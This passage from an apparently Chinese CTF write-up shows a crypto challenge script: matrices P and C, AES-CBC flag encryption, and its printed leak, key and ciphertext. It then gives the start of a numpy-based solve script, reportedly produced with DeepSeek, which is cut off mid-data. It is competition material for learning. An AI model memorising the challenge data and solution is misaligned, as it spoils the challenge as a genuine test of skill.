class="string">f&quot;<span class="subst">&#123;C=&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">P=[[87, -27, -52, -29], [57, -41, -24, -60], [76, -17, -55, -37], [75, -46, -33, -21], [121, -55, -33, -34], [47, -4, -34, -45], [112, -33, -44, -16], [74, -44, -5, -25], [20, -21, -16, -49], [89, -21, -54, -24], [18, -23, -53, -1], [35, -40, -4, -29], [105, -54, -2, -8], [44, -24, -43, -36], [111, -15, -15, -54]]</span></span><br><span class="line"><span class="string">C=[[24, 75, 81, 85], [24, 14, 85, 102], [115, 1, 5, 21], [58, 118, 104, 77], [65, 42, 101, 103], [33, 38, 50, 67], [7, 81, 38, 58], [117, 101, 54, 11], [44, 29, 81, 8], [59, 114, 70, 121], [62, 13, 9, 105], [11, 43, 97, 23], [39, 82, 75, 97], [122, 113, 14, 30], [70, 102, 116, 5], [58, 44, 61, 20], [73, 119, 59, 28], [119, 68, 57, 122], [61, 91, 83, 44], [103, 29, 1, 73], [47, 60, 120, 125], [17, 126, 14, 21], [104, 8, 78, 123], [72, 121, 54, 74], [48, 104, 49, 66], [72, 56, 27, 69], [34, 110, 41, 54], [33, 54, 74, 44], [70, 65, 11, 113], [122, 3, 69, 35], [58, 7, 39, 64], [59, 106, 49, 66], [77, 92, 87, 92], [95, 21, 96, 83], [67, 55, 30, 73], [99, 54, 18, 90], [101, 102, 126, 107], [81, 46, 104, 83], [38, 24, 94, 60], [114, 105, 76, 97], [22, 115, 20, 67], [40, 72, 110, 65], [111, 92, 106, 117], [5, 123, 21, 96], [41, 14, 23, 114], [113, 75, 43, 65], [56, 3, 61, 48], [40, 101, 16, 114], [42, 84, 95, 13], [36, 110, 91, 107], [4, 13, 60, 74], [24, 80, 125, 76], [123, 26, 27, 119], [31, 87, 6, 123], [61, 106, 73, 120], [66, 10, 36, 65], [91, 38, 46, 9], [121, 20, 106, 48], [123, 21, 78, 27], [22, 74, 55, 110], [47, 49, 118, 76], [30, 10, 16, 118], [43, 19, 52, 61], [100, 9, 37, 35], [20, 102, 111, 94], [116, 63, 55, 43], [13, 110, 42, 14], [46, 65, 71, 28], [82, 5, 76, 74], [86, 34, 117, 84], [28, 44, 82, 50], [76, 79, 77, 11], [68, 39, 51, 89], [83, 93, 95, 2], [54, 108, 101, 82], [99, 90, 122, 37], [16, 92, 79, 12], [67, 86, 24, 36], [80, 94, 106, 59], [50, 56, 95, 98], [33, 68, 89, 40], [74, 124, 14, 82], [88, 93, 54, 93], [51, 17, 124, 31], [17, 17, 45, 35], [113, 71, 76, 44], [48, 6, 120, 4], [36, 91, 108, 11], [2, 41, 58, 72], [42, 59, 51, 81], [73, 22, 79, 27], [85, 35, 29, 98], [76, 76, 37, 22], [82, 29, 42, 27], [75, 114, 37, 106], [40, 69, 53, 73], [39, 44, 33, 121], [94, 85, 92, 54], [91, 77, 124, 46], [108, 31, 101, 84], [35, 33, 97, 45], [99, 32, 17, 14], [1, 66, 11, 35], [78, 100, 95, 81], [73, 49, 14, 37], [70, 9, 107, 2], [84, 98, 92, 62], [123, 87, 87, 110], [3, 81, 111, 28], [20, 2, 91, 37], [93, 101, 77, 93], [27, 16, 31, 105], [95, 81, 87, 17], [10, 103, 21, 102], [81, 57, 118, 82], [15, 92, 60, 71], [16, 84, 126, 49], [35, 26, 2, 120], [70, 86, 45, 9], [29, 8, 40, 66], [99, 77, 14, 9], [12, 70, 50, 52], [21, 21, 85, 54], [91, 94, 100, 85], [9, 42, 47, 14], [117, 55, 17, 99], [53, 45, 4, 72], [49, 10, 27, 121], [108, 61, 73, 42], [121, 42, 41, 71], [49, 63, 50, 117], [5, 78, 24, 101], [0, 117, 21, 46], [90, 43, 47, 32], [74, 85, 118, 84], [13, 73, 18, 66], [95, 24, 120, 18], [94, 21, 111, 34], [66, 68, 80, 21], [102, 49, 57, 55], [25, 85, 107, 98], [8, 18, 88, 12], [18, 6, 86, 82], [18, 91, 126, 115], [26, 11, 30, 35], [88, 78, 76, 74], [51, 75, 76, 15], [60, 24, 72, 27], [91, 72, 44, 104], [84, 113, 39, 116], [41, 83, 91, 74], [84, 17, 94, 119], [46, 95, 85, 5], [109, 58, 71, 42], [126, 29, 114, 73], [27, 70, 7, 125], [121, 66, 97, 111], [8, 21, 10, 57], [15, 62, 65, 8], [101, 79, 32, 74], [69, 42, 38, 58], [65, 81, 72, 16], [20, 81, 1, 126], [91, 111, 69, 33], [56, 84, 65, 66], [47, 78, 43, 100], [43, 90, 80, 25], [46, 55, 10, 60], [116, 110, 49, 116], [72, 115, 38, 104], [79, 43, 74, 106], [86, 113, 84, 76], [102, 2, 119, 3], [126, 25, 83, 44], [37, 83, 46, 40], [13, 75, 101, 101], [76, 93, 3, 63], [69, 9, 84, 37], [103, 47, 106, 80], [72, 104, 85, 19], [124, 118, 34, 81], [57, 25, 52, 119], [44, 56, 63, 90], [123, 46, 124, 31], [19, 116, 23, 77], [126, 78, 37, 93], [34, 95, 43, 98], [37, 90, 32, 97], [106, 8, 80, 8], [90, 5, 113, 68], [99, 40, 39, 18], [90, 37, 48, 45], [56, 13, 76, 6], [68, 33, 52, 102], [62, 45, 29, 123], [100, 21, 73, 92], [92, 18, 118, 23], [84, 86, 42, 83], [107, 8, 71, 52], [114, 106, 78, 85], [10, 120, 115, 119], [27, 49, 124, 16], [65, 40, 48, 37], [69, 42, 8, 29], [35, 39, 55, 102], [58, 19, 41, 75], [17, 2, 113, 12], [8, 34, 72, 75], [91, 32, 19, 52], [62, 50, 109, 78], [9, 115, 35, 50], [42, 83, 78, 41], [34, 94, 97, 58], [56, 73, 25, 115], [55, 12, 16, 86], [97, 95, 30, 92], [47, 105, 70, 68], [50, 18, 51, 23], [46, 57, 80, 29], [4, 66, 123, 24], [55, 53, 26, 36], [71, 59, 104, 91], [94, 3, 1, 34], [57, 8, 85, 102], [89, 73, 115, 25], [13, 38, 81, 76], [104, 30, 81, 104], [55, 101, 95, 101], [69, 65, 5, 11], [123, 105, 84, 125], [38, 110, 4, 28], [112, 115, 92, 71], [90, 120, 112, 39], [50, 18, 107, 71], [95, 63, 118, 93], [93, 111, 59, 55], [17, 15, 2, 88], [78, 126, 37, 12], [56, 112, 53, 12], [65, 34, 82, 100], [9, 94, 72, 99], [78, 76, 43, 91], [7, 88, 107, 31], [43, 91, 97, 4], [113, 112, 36, 15], [8, 97, 23, 84], [65, 92, 31, 63], [54, 38, 119, 103], [89, 50, 57, 50], [61, 37, 87, 0], [21, 35, 44, 22], [20, 32, 95, 116], [10, 94, 103, 84], [59, 29, 7, 50], [98, 33, 87, 33], [7, 96, 36, 67], [85, 10, 35, 98], [65, 49, 19, 62], [56, 67, 14, 91], [30, 49, 111, 77], [121, 49, 108, 119], [89, 67, 115, 69], [65, 8, 0, 82], [117, 57, 117, 23], [23, 38, 2, 98], [60, 28, 94, 93], [23, 65, 8, 114], [121, 105, 122, 40], [120, 12, 21, 112], [55, 51, 2, 77], [48, 41, 113, 62], [66, 82, 117, 119], [4, 15, 5, 21], [41, 14, 12, 80], [23, 61, 106, 16], [23, 53, 122, 68], [6, 54, 5, 101], [69, 49, 7, 79], [17, 70, 64, 88], [103, 30, 76, 31], [108, 82, 90, 109], [55, 56, 113, 37], [93, 99, 126, 44], [1, 46, 105, 124], [55, 54, 35, 115], [0, 89, 53, 97], [67, 111, 107, 80], [92, 122, 40, 64], [75, 2, 126, 118], [90, 84, 43, 74], [101, 69, 60, 17], [104, 10, 4, 122], [94, 4, 115, 91], [15, 11, 111, 105], [9, 7, 32, 101], [77, 18, 55, 56], [66, 7, 117, 108], [116, 121, 33, 66], [32, 41, 83, 125], [60, 52, 70, 58], [125, 54, 93, 15], [70, 19, 10, 58], [83, 94, 61, 126], [95, 85, 80, 44], [25, 89, 117, 74], [12, 17, 63, 87], [118, 80, 96, 26], [6, 97, 79, 38], [97, 3, 107, 95], [7, 82, 106, 92], [83, 100, 119, 95], [81, 26, 99, 56], [25, 60, 51, 122], [56, 18, 22, 84], [9, 72, 107, 114], [80, 97, 92, 52], [108, 47, 58, 46], [9, 47, 7, 47], [115, 68, 91, 7], [14, 120, 87, 122], [97, 15, 40, 79], [5, 92, 85, 93], [4, 97, 73, 63], [25, 22, 92, 108], [88, 4, 34, 86], [0, 43, 21, 57], [67, 90, 36, 50], [15, 126, 37, 12], [92, 73, 96, 71], [76, 107, 27, 115], [79, 8, 68, 55], [38, 12, 120, 126], [54, 46, 7, 69], [72, 114, 93, 60], [59, 98, 27, 102], [50, 76, 87, 19], [77, 107, 29, 40], [36, 73, 21, 123], [36, 89, 82, 74], [24, 73, 118, 86], [58, 89, 115, 106], [12, 27, 33, 72], [28, 94, 21, 26], [0, 79, 48, 110], [72, 62, 82, 57], [65, 84, 114, 97], [80, 68, 52, 52], [119, 35, 103, 101], [10, 67, 68, 69], [101, 17, 54, 40], [98, 46, 21, 42], [30, 39, 56, 118], [27, 33, 77, 114], [66, 74, 61, 63], [23, 13, 14, 47], [88, 30, 122, 119], [15, 58, 55, 52], [56, 27, 47, 45], [119, 95, 59, 14], [84, 69, 5, 83], [21, 35, 39, 36], [10, 92, 68, 17], [79, 67, 111, 38], [36, 1, 4, 117], [117, 30, 5, 7], [112, 15, 115, 123], [54, 47, 18, 93], [102, 111, 3, 68], [91, 91, 5, 44], [123, 118, 57, 32], [12, 121, 31, 103], [114, 52, 105, 12], [100, 28, 117, 102], [51, 42, 12, 124], [47, 1, 42, 47], [28, 3, 22, 100], [103, 105, 119, 24], [101, 59, 13, 78], [79, 36, 61, 54], [11, 46, 75, 116], [31, 73, 118, 0], [92, 32, 0, 124], [77, 85, 25, 90], [29, 21, 74, 7], [3, 66, 11, 8], [112, 91, 50, 53], [45, 113, 99, 123], [35, 65, 85, 22], [108, 99, 42, 1], [103, 113, 116, 72], [125, 74, 112, 24], [75, 79, 80, 12], [83, 44, 94, 86], [64, 20, 0, 8], [104, 126, 31, 120], [85, 75, 61, 74], [36, 93, 36, 102], [70, 54, 101, 83], [90, 46, 109, 83], [112, 126, 114, 23], [16, 123, 97, 62], [118, 86, 108, 53], [99, 18, 2, 18], [103, 3, 38, 8], [99, 49, 123, 81], [37, 75, 89, 53], [34, 77, 27, 122], [29, 8, 40, 66], [119, 13, 64, 83], [4, 108, 116, 121], [49, 87, 1, 92], [15, 63, 80, 62], [27, 81, 100, 83], [7, 90, 16, 0], [13, 50, 61, 65], [51, 64, 76, 5], [55, 100, 106, 66], [52, 102, 105, 2], [49, 34, 89, 116], [24, 55, 11, 27], [91, 48, 73, 38], [27, 5, 1, 126], [66, 55, 80, 19], [52, 118, 104, 43], [36, 1, 111, 60], [65, 4, 34, 17], [54, 22, 0, 39], [52, 30, 64, 62], [26, 40, 32, 86], [93, 71, 41, 47], [77, 23, 15, 9], [11, 20, 51, 31], [64, 50, 37, 50], [17, 49, 80, 37], [119, 115, 115, 50], [20, 86, 27, 5], [101, 65, 17, 78], [56, 25, 125, 56], [16, 118, 2, 96], [114, 108, 69, 121], [14, 37, 76, 101], [113, 124, 121, 82], [43, 120, 35, 94], [82, 67, 23, 43], [9, 79, 47, 122], [39, 28, 110, 31], [35, 48, 27, 16], [72, 8, 115, 66], [54, 46, 122, 19], [77, 77, 30, 74], [58, 63, 81, 96], [6, 122, 75, 63], [115, 31, 119, 110], [82, 86, 89, 1], [79, 100, 6, 110], [117, 67, 15, 13], [4, 15, 63, 0], [106, 108, 122, 107], [34, 72, 0, 114], [20, 0, 32, 56], [121, 104, 66, 3], [86, 28, 76, 84], [85, 9, 60, 45], [95, 80, 78, 65], [39, 85, 50, 49], [42, 103, 36, 90], [70, 99, 116, 117], [34, 15, 40, 52], [24, 49, 19, 31], [98, 90, 95, 89], [63, 45, 40, 77], [114, 14, 30, 106], [10, 35, 116, 9], [103, 111, 112, 16], [71, 112, 71, 32], [77, 31, 105, 64], [84, 87, 24, 67], [1, 27, 123, 57], [104, 29, 87, 123], [110, 39, 67, 7], [28, 70, 108, 113], [96, 9, 101, 36], [13, 28, 6, 13], [69, 81, 89, 26], [79, 113, 77, 91], [112, 62, 104, 117], [109, 95, 55, 83], [78, 68, 98, 14], [73, 79, 96, 12], [108, 39, 97, 49], [27, 111, 106, 100], [82, 70, 9, 36], [48, 31, 90, 70], [99, 92, 45, 35], [55, 100, 31, 37], [75, 17, 69, 35], [12, 38, 119, 112], [103, 34, 63, 76], [26, 19, 91, 111], [74, 122, 12, 78], [64, 117, 16, 60], [2, 97, 122, 106], [62, 79, 56, 30], [71, 47, 13, 22], [38, 78, 116, 16], [87, 28, 94, 76], [77, 126, 94, 116], [83, 46, 104, 90], [5, 95, 13, 26], [47, 10, 46, 115], [82, 19, 91, 70], [111, 72, 49, 65], [18, 103, 59, 72], [17, 37, 56, 24], [19, 120, 24, 64], [28, 40, 11, 20], [18, 19, 80, 62], [37, 11, 74, 14], [109, 97, 75, 72], [116, 65, 52, 121], [95, 63, 82, 122], [88, 93, 54, 93], [77, 30, 65, 121], [99, 121, 42, 87], [62, 52, 44, 6], [79, 60, 55, 4], [96, 64, 6, 20], [94, 114, 90, 8], [123, 98, 29, 27], [116, 84, 31, 80], [9, 77, 45, 45], [120, 33, 63, 15], [51, 44, 66, 25], [2, 46, 72, 94], [107, 113, 50, 46], [115, 64, 126, 85], [64, 10, 28, 78], [84, 112, 64, 103], [59, 114, 15, 82], [65, 122, 104, 89], [113, 122, 21, 11], [69, 106, 19, 78], [42, 93, 125, 0], [7, 123, 82, 70], [103, 114, 62, 92], [15, 30, 78, 114], [4, 78, 111, 60], [40, 80, 34, 55], [3, 87, 120, 27], [122, 64, 3, 122], [24, 49, 31, 81], [26, 43, 100, 19], [52, 78, 2, 97], [116, 45, 15, 33], [21, 119, 92, 86], [28, 118, 71, 24], [106, 15, 0, 79], [36, 4, 52, 73], [22, 43, 8, 60], [96, 22, 9, 100], [19, 64, 26, 96], [97, 61, 22, 39], [6, 112, 76, 38], [58, 6, 97, 94], [103, 87, 87, 101], [17, 49, 80, 37], [117, 33, 26, 8], [59, 108, 78, 91], [113, 28, 30, 44], [119, 78, 72, 20], [49, 101, 77, 2], [26, 18, 35, 7], [34, 38, 99, 37], [45, 52, 90, 27], [108, 31, 118, 67], [3, 37, 29, 88], [111, 96, 12, 111], [91, 111, 106, 100], [52, 78, 117, 80], [14, 51, 87, 0], [1, 52, 116, 1], [117, 2, 33, 48], [57, 0, 48, 34], [59, 14, 84, 63], [82, 83, 8, 82], [58, 100, 32, 33], [75, 29, 112, 103], [0, 49, 45, 54], [94, 9, 51, 110], [54, 61, 27, 47], [88, 89, 23, 37], [73, 43, 0, 32], [123, 6, 35, 78], [73, 72, 119, 64], [81, 46, 11, 102], [42, 124, 47, 8], [50, 66, 3, 40], [116, 7, 51, 20], [47, 112, 99, 7], [42, 37, 86, 89], [18, 74, 78, 101], [57, 85, 75, 7], [26, 90, 35, 10], [72, 126, 10, 77], [55, 12, 5, 78], [37, 87, 85, 96], [91, 9, 114, 68], [79, 76, 44, 20], [84, 52, 63, 56], [95, 9, 22, 117], [96, 38, 50, 67], [43, 114, 45, 56], [94, 21, 74, 107], [92, 82, 81, 71], [40, 10, 10, 90], [20, 18, 15, 56], [72, 2, 30, 22], [50, 31, 123, 20], [85, 40, 115, 115], [93, 1, 48, 47], [111, 118, 45, 34], [9, 122, 37, 121], [60, 27, 77, 41], [122, 38, 22, 39], [115, 66, 74, 126], [77, 67, 90, 78], [96, 3, 53, 52], [5, 26, 120, 101], [45, 100, 72, 6], [106, 56, 87, 77], [52, 68, 102, 95], [1, 13, 36, 33], [58, 27, 35, 8], [52, 5, 38, 35], [102, 82, 63, 47], [24, 71, 119, 43], [11, 36, 90, 13], [11, 93, 27, 23], [4, 107, 26, 125], [85, 9, 5, 13], [116, 25, 55, 119], [73, 82, 73, 2], [40, 123, 77, 41], [10, 98, 51, 111], [23, 79, 120, 54], [56, 18, 22, 84], [61, 115, 51, 109], [33, 5, 12, 121], [8, 81, 35, 70], [22, 39, 103, 2], [38, 74, 66, 126], [83, 20, 117, 85], [8, 32, 91, 98], [37, 31, 94, 119], [7, 30, 45, 43], [68, 16, 124, 97], [86, 124, 37, 21], [29, 101, 15, 30], [27, 31, 52, 45], [47, 37, 102, 3], [117, 49, 54, 89], [48, 94, 126, 66], [42, 115, 63, 104], [14, 74, 6, 112], [68, 125, 4, 5], [66, 3, 78, 52], [108, 33, 6, 77], [77, 99, 16, 52], [61, 78, 73, 70], [108, 106, 124, 0], [23, 35, 119, 118], [125, 124, 37, 65], [69, 30, 61, 110], [77, 10, 120, 118], [53, 121, 24, 30], [87, 32, 29, 63], [54, 64, 1, 3], [16, 59, 104, 25], [30, 6, 59, 102], [43, 120, 35, 94], [89, 13, 69, 39], [87, 78, 100, 14], [83, 17, 14, 4], [24, 49, 31, 81], [73, 32, 72, 10], [0, 22, 61, 54], [81, 42, 70, 13], [108, 56, 52, 2], [25, 99, 116, 72], [66, 23, 18, 102], [121, 115, 47, 12], [96, 37, 123, 48], [64, 69, 4, 39], [78, 38, 124, 31], [27, 69, 10, 70], [5, 29, 2, 85], [30, 45, 56, 7], [31, 25, 120, 61], [36, 89, 89, 118], [98, 63, 18, 21], [121, 83, 36, 57], [60, 5, 86, 17], [121, 55, 117, 58], [12, 96, 4, 27], [119, 63, 124, 37], [96, 27, 45, 91], [42, 119, 8, 103], [104, 42, 68, 37], [104, 55, 41, 38], [120, 3, 50, 87], [120, 121, 20, 67], [58, 123, 50, 28], [103, 62, 58, 20], [97, 27, 89, 102], [7, 51, 56, 108], [73, 60, 10, 77], [56, 72, 103, 69], [101, 89, 18, 66], [115, 35, 80, 36], [98, 103, 39, 63], [29, 126, 67, 76], [27, 97, 15, 79], [36, 6, 17, 90], [126, 54, 101, 42], [115, 66, 74, 126], [78, 80, 62, 83], [60, 11, 31, 88], [16, 73, 108, 13]]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">encrypted = AES.new(key=key, iv=iv, mode=AES.MODE_CBC).encrypt(<span class="string">b&quot;&quot;</span>.join([pad(i.encode(), <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"><span class="built_in">print</span>(encrypted)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">-3.257518803980229925210589904230583482986646342139415561576950148286382674434770529248486501793457710730252401258721482142654716015216299244487794967600132597049154513815052213387666360825101667524635777006510550117512116441539852315185793280311905620746025669520152068447372368293640072502196959919309286241</span></span><br><span class="line"><span class="string">b&#x27;\x8fj\x94\x98-\x1fd\xd5\x89\xbe\xa9*Tu\x90\xb7&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x9fT@\xbc\x82\x8esQ\x1e\xd8\x1d\xdb\x9b\xb4\xf8rU\xc8\xa0\xcb\xaf H\xa9.\x04\x1e\xd2\x92\x1f\x0fBja-\x965x\xa8@\xc9x\xf9\xaf\x87\xd1\xa5&#125;\xfc\x1b\xe0#\xc3m\xc9\x8973\x1c\x1f\x13\x8f\xb2a\xae\xa9]\xb9\xc2\xe8\x83A\x80\x13g\xc9a\x1c&lt;\x8a\x9c&amp;\xd9\xbd\x06\xef\xba9\xb0\x03\x9f\x022\xc9\x13\x9a\xffXPG\xc6o\xc0\xeaV7)XG9L\x84N7U\xe3Wn0G\x8e\xd3\x04(\n\x08\xb9\x17\xe6\xf1\xaa\xb7\x8a@$\x16\x13\x06A\x00\xc9Z\xdf\x7fQ\xc9\x08\xb4\xf3P\xfcpe\xe2\xeb\x96\x0e(-\xde\x17\xd1\x01\x1c_\x82\x8b\x9fw\xc8\x86\xfbw\xb5\xf7\xd0\xc8\x1784\xe3?\x00\x0b.)\xb7\xbc\x8e&#123;\xe0\xae\x8d$\x0f\x19\&#x27;\xb6\xee@d\x00\xd9\x84\x8c\x0e\xa3,\xc6a\xa3\xba*1\xfd&lt;\xfd\x18\xd6\x9e\x8c4\x8e#\xfd\xbd&amp;0R\xeddE,\xed\xb6\x1e\x00\x11\xa6K\xd3\x1dT\x8c5\x8e\x00\xea\x10\xe9\&#x27;u&quot;B#\xa1#\xd8\xe3\xf5j\xbc\x94M\xda\xe3\xcb*\xf0W1\xa0\x80\x1d\xfc\xbfo\x01?(da\r\xb6\x86\xd0\x90\x88Z\xa1`B\x89\x89\x89\xb3v\xa5\xf0\xe0\x0c\x8e\xcc+P\xfc\xfd#\x83\xe9\x93\x96\n\xf2\xa5\xfb\xc3\xc5\xaa\x9e\x89\x93\xb6\xf5\xea\x8c%NY\xc3\x0eR\xfas\xa1\x13\xf2/*\xce\x8b_:_r\xeb\xbe\x0b\x8a\x8c\x97\x7f|m&#125;\xae\xa9I\x95\xcc\xe7\x80\xa5yC4\x1f5\xa4P\xc5\xbf.\xf9V\xe8|\xbb\xc3\xcb\x98&amp;\&#x27;JB\x99\x94\xc0\r$\x0b\xbe48u\xeb\xca\xa1\xfbb\xd8_R\x97\x8e\xaeI\xfc\xc2\xb2\xd2#@\xec\x16\xf1\xd7eCQ\x1cO\x13\xca\xb5\xd3\x1a\xb1\xf1_D\x80\x06\xa5\xbe\xbev\xbd\xd6\xbb\x9a\xc9x\x9cf:\xcb&gt;\xa2\xe1\xcad\xde]aw\xa0\xdc\xb2\xb3&#123;+\x85\x8d\x8b\xc5\rT\xcc\xd9X\xd5\x9b\r&lt;\x99m\xb8b6s\xbfp\x0eo~\xe9&amp;\xb2&#123;\xbe\xee\x93\xd2N1\\\x94\x968IWO7\xcb\xb6e\x80\xf7\x9air\xb2~\x17\x1cF\x0f\x82T]RBX\xdex\x13\x85\xfa\xcd-\xce\xdc\xe4\xe5^\x99u\xb5\x01\xd0-\xc3C\xcd\xc4y6\xb7\x9d|L1\xe74\xf7\x8cH\xe9\xa9\xfav\n\xec;\xf2\xa2w\xfb\x13_b\r)z!\xa3\xc8\xa8\xc2\xd2\x10\x00\x11\x11\r\xb2&amp;\xfb\x04&amp;\x84&quot;&gt;x6l[\x06n&gt;\xa0\xbe\x9c`\xa7\x9e\xe0\xfb\x85\x91\xc4,\xcf\xac\xe11@a\xed3@\xfd&#125;\x8e\xfaTp\xcb7\xe7\xbf\xd4\xe0~b\xd9\xe0&lt;\xba\x81\xd4&quot;e\xfc\x939|j#0H\x86\xf8\x0b\x03\xd2\xe8\xf5\xe55\xdc\xc8\x06\\\xb7)\xcc\x9b\&#x27;\xf12&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>让DeepSeek做</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-134740.jpg" alt="1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given data</span></span><br><span class="line">P = [[<span class="number">87</span>, -<span class="number">27</span>, -<span class="number">52</span>, -<span class="number">29</span>], [<span class="number">57</span>, -<span class="number">41</span>, -<span class="number">24</span>, -<span class="number">60</span>], [<span class="number">76</span>, -<span class="number">17</span>, -<span class="number">55</span>, -<span class="number">37</span>], [<span class="number">75</span>, -<span class="number">46</span>, -<span class="number">33</span>, -<span class="number">21</span>], [<span class="number">121</span>, -<span class="number">55</span>, -<span class="number">33</span>, -<span class="number">34</span>], [<span class="number">47</span>, -<span class="number">4</span>, -<span class="number">34</span>, -<span class="number">45</span>], [<span class="number">112</span>, -<span class="number">33</span>, -<span class="number">44</span>, -<span class="number">16</span>], [<span class="number">74</span>, -<span class="number">44</span>, -<span class="number">5</span>, -<span class="number">25</span>], [<span class="number">20</span>, -<span class="number">21</span>, -<span class="number">16</span>, -<span class="number">49</span>], [<span class="number">89</span>, -<span class="number">21</span>, -<span class="number">54</span>, -<span class="number">24</span>], [<span class="number">18</span>, -<span class="number">23</span>, -<span class="number">53</span>, -<span class="number">1</span>], [<span class="number">35</span>, -<span class="number">40</span>, -<span class="number">4</span>, -<span class="number">29</span>], [<span class="number">105</span>, -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">8</span>], [<span class="number">44</span>, -<span class="number">24</span>, -<span class="number">43</span>, -<span class="number">36</span>], [<span class="number">111</span>, -<span class="number">15</span>, -<span class="number">15</span>, -<span class="number">54</span>]]</span><br><span class="line">C = [[<span class="number">24</span>, <span class="number">75</span>, <span class="number">81</span>, <span class="number">85</span>], [<span class="number">24</span>, <span class="number">14</span>, <span class="number">85</span>, <span class="number">102</span>], [<span class="number">115</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">21</span>], [<span class="number">58</span>, <span class="number">118</span>, <span class="number">104</span>, <span class="number">77</span>], [<span class="number">65</span>, <span class="number">42</span>, <span class="number">101</span>, <span class="number">103</span>], [<span class="number">33</span>, <span class="number">38</span>, <span class="number">50</span>, <span class="number">67</span>], [<span class="number">7</span>, <span class="number">81</span>, <span class="number">38</span>, <span class="number">58</span>], [<span class="number">117</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">11</span>], [<span class="number">44</span>, <span class="number">29</span>, <span class="number">81</span>, <span class="number">8</span>], [<span class="number">59</span>, <span class="number">114</span>, <span class="number">70</span>, <span class="number">121</span>], [<span class="number">62</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">105</span>], [<span class="number">11</span>, <span class="number">43</span>, <span class="number">97</span>, <span class="number">23</span>], [<span class="number">39</span>, <span class="number">82</span>, <span class="number">75</span>, <span class="number">97</span>], [<span class="number">122</span>, <span class="number">113</span>, <span class="number">14</span>, <span class="number">30</span>], [<span class="number">70</span>, <span class="number">102</span>, <span class="number">116</span>, <span class="number">5</span>], [<span class="number">58</span>, <span class="number">44</span>, <span class="number">61</span>, <span class="number">20</span>], [<span class="number">73</span>, <span class="number">119</span>, <span class="number">59</span>, <span class="number">28</span>], [<span class="number">119</span>, <span class="number">68</span>, <span class="number">57</span>, <span class="number">122</span>], [<span class="number">61</span>, <span class="number">91</span>, <span class="number">83</span>, <span class="number">44</span>], [<span class="number">103</span>, <span class="number">29</span>, <span class="number">1</span>, <span class="number">73</span>], [<span class="number">47</span>, <span class="number">60</span>, <span class="number">120</span>, <span class="number">125</span>], [<span class="number">17</span>, <span class="number">126</span>, <span class="number">14</span>, <span class="number">21</span>], [<span class="number">104</span>, <span class="number">8</span>, <span class="number">78</span>, <span class="number">123</span>], [<span class="number">72</span>, <span class="number">121</span>, <span class="number">54</span>, <span class="number">74</span>], [<span class="number">48</span>, <span class="number">104</span>, <span class="number">49</span>, <span class="number">66</span>], [<span class="number">72</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">69</span>], [<span class="number">34</span>, <span class="number">110</span>, <span class="number">41</span>, <span class="number">54</span>], [<span class="number">33</span>, <span class="number">54</span>, <span class="number">74</span>, <span class="number">44</span>], [<span class="number">70</span>, <span class="number">65</span>, <span class="number">11</span>, <span class="number">113</span>], [<span class="number">122</span>, <span class="number">3</span>, <span class="number">69</span>, <span class="number">35</span>], [<span class="number">58</span>, <span class="number">7</span>, <span class="number">39</span>, <span class="number">64</span>], [<span class="number">59</span>, <span class="number">106</span>, <span class="number">49</span>, <span class="number">66</span>], [<span class="number">77</span>, <span class="number">92</span>, <span class="number">87</span>, <span class="number">92</span>], [<span class="number">95</span>, <span class="number">21</span>, <span class="number">96</span>, <span class="number">83</span>], [<span class="number">67</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">73</span>], [<span class="number">99</span>, <span class="number">54</span>, <span class="number">18</span>, <span class="number">90</span>], [<span class="number">101</span>, <span class="number">102</span>, <span class="number">126</span>, <span class="number">107</span>], [<span class="number">81</span>, <span class="number">46</span>, <span class="number">104</span>, <span class="number">83</span>], [<span class="number">38</span>, <span class="number">24</span>, <span class="number">94</span>, <span class="number">60</span>], [<span class="number">114</span>, <span class="number">105</span>, <span class="number">76</span>, <span class="number">97</span>], [<span 